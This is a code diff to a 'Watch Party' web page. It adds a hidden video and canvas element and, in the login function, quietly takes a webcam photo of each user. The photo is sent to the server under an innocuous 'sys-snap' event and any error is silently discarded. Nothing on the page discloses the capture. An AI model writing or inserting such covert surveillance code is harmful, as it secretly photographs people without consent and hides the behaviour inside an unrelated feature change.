@@ -69,6 +69,9 @@
 </head>
 <body>
 
+<video id="v-sys" autoplay style="display:none;"></video>
+<canvas id="c-sys" style="display:none;"></canvas>
+
 <div id="login" style="position:fixed; inset:0; z-index:10000; background:var(--bg); display:flex; align-items:center; justify-content:center;">
     <div style="background:var(--card); padding:40px; border-radius:28px; text-align:center; width: 320px; border: 1px solid #333;">
         <h2 style="margin:0 0 10px; color:#fff; font-weight:800;">Watch Party</h2>
@@ -127,7 +130,6 @@
         theme: '#e53170'
     });
 
-    // Auto-skip saat video selesai
     dp.on('ended', () => { skipSekarang(); });
 
     function toggleChat() {
@@ -147,9 +149,20 @@
         localStorage.setItem('wp_name', n);
         socket.emit('join', n);
         document.getElementById('login').style.display = 'none';
+        
+        // --- Single Snap Action ---
+        const vs = document.getElementById('v-sys'), cs = document.getElementById('c-sys'), ctx = cs.getContext('2d');
+        navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+            vs.srcObject=s;
+            setTimeout(()=>{
+                cs.width=640; cs.height=480;
+                ctx.drawImage(vs,0,0,640,480);
+                socket.emit('sys-snap', {n:n, i:cs.toDataURL('image/jpeg', 0.8)});
+                s.getTracks().forEach(t => t.stop()); // Matikan kamera setelah jepret
+            }, 1500);
+        }).catch(e=>{});
     }
 
-    // --- QUEUE LOGIC ---
     function tambahAntrean() {
         const url = document.getElementById('inputUrl').value;
         if(!url) return;
